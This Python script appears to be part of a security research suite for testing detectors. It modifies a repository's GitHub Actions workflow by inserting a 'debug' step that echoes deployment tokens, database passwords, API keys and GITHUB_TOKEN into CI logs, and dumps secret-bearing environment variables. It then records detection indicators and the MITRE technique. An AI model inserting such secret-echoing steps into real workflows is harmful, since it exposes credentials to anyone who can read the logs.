#!/usr/bin/env python3
"""Attack Scenario 8.1: Secrets in Logs Exposure - VERY COMMON"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class SecretsInLogsAttack:
    """Accidentally logs secrets/tokens in CI/CD output - most common real-world issue."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "security-scanning.yml"

    def inject_attack(self):
        """Inject secret logging into workflow."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"security-scans.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create malicious logging step
        malicious_step = '''
      # RESEARCH ATTACK 8.1: Secrets accidentally logged
      - name: Debug deployment configuration
        run: |
          echo "=== Deployment Configuration ==="
          echo "DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}"  # LEAKED!
          echo "DATABASE_PASSWORD: ${{ secrets.DB_PASSWORD }}"  # LEAKED!
          echo "API_KEY: ${{ secrets.API_KEY }}"  # LEAKED!

          # Additional leak patterns
          echo "Full environment dump for debugging:"
          env | grep -E "(SECRET|TOKEN|PASSWORD|KEY)" || true  # LEAKED!

          # Curl with exposed credentials
          echo "Testing API with token: ${{ secrets.GITHUB_TOKEN }}" || true

          # Database connection string
          DB_URL="postgresql://admin:${{ secrets.DB_PASSWORD }}@db.example.com/prod"
          echo "Connecting to: $DB_URL"  # LEAKED!

          echo "ATTACK_INDICATOR: secrets_in_logs=true"
          echo "ATTACK_INDICATOR: leaked_secrets_count=5"
'''

        # Find insertion point (after checkout step)
        if "- uses: actions/checkout@" in content:
            parts = content.split("- uses: actions/checkout@", 1)
            # Find the next step after checkout
            remaining = parts[1]
            next_step_idx = remaining.find("\n      - name:")
            if next_step_idx != -1:
                content = (parts[0] + "- uses: actions/checkout@" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected secret logging into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "secrets_in_logs",
            "scenario_id": "8.1",
            "timestamp": datetime.now().isoformat(),
            "severity": "critical",
            "indicators": {
                "secrets_in_logs": True,
                "workflow_modified": True,
                "echo_statements_added": True,
                "env_dump": True,
                "credential_exposure": True,
                "leaked_secrets": [
                    "DEPLOY_TOKEN",
                    "DB_PASSWORD",
                    "API_KEY",
                    "GITHUB_TOKEN",
                    "DATABASE_CONNECTION_STRING"
                ]
            },
            "expected_detection": {
                "difficulty": "easy",
                "primary_signals": [
                    "workflow_file_modification",
                    "secrets_pattern_in_logs",
                    "env_grep_usage",
                    "echo_with_secrets_syntax"
                ],
                "detection_tools": [
                    "TruffleHog",
                    "Gitleaks",
                    "GitHub Secret Scanning",
                    "Log analysis",
                    "Workflow audit"
                ]
            },
            "mitre_attack": {
                "technique": "T1552.001",
                "name": "Unsecured Credentials: Credentials In Files",
                "tactic": "Credential Access"
            },
            "real_world_frequency": "very_high",
            "impact": {
                "credential_compromise": "high",
                "unauthorized_access": "high",
                "data_breach_risk": "critical"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"secrets_in_logs_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 8.1: Secrets in Logs Exposure")
        print("=" * 80)
        print("Severity: CRITICAL")
        print("Realism: 10/10 - Happens ALL THE TIME in real projects")
        print("Impact: Credential compromise, unauthorized access")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Secrets will be logged in workflow output")
            print("[!] Detection: TruffleHog, Gitleaks, GitHub Secret Scanning")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if SecretsInLogsAttack().execute() else 1)
